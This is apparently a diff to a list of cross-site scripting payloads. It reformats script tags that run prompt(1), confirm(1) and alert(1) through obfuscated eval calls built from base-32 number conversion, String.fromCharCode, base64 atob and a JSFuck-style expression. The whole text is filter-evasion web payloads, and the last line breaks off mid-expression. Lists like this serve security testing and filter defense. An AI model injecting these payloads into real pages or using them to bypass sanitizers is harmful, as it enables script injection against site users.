@@ -1,17 +1,8 @@
     <script>prompt(1)</script>
     <script>confirm(1)</script>
-    <script>
-    var fn=window[490837..toString(1<<5)];
-    fn(atob('YWxlcnQoMSk='));
-    </script>
-    <script>
-    var fn=window[String.fromCharCode(101,118,97,108)];
-    fn(atob('YWxlcnQoMSk='));
-    </script>
-    <script>
-    var fn=window[atob('ZXZhbA==')];
-    fn(atob('YWxlcnQoMSk='));
-    </script>
+    <script>var fn=window[490837..toString(1<<5)];fn(atob('YWxlcnQoMSk='));</script>
+    <script>var fn=window[String.fromCharCode(101,118,97,108)];fn(atob('YWxlcnQoMSk='));</script>
+    <script>var fn=window[atob('ZXZhbA==')];fn(atob('YWxlcnQoMSk='));</script>
     <script>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
     <script>this[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>
     <script>this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]] </script>
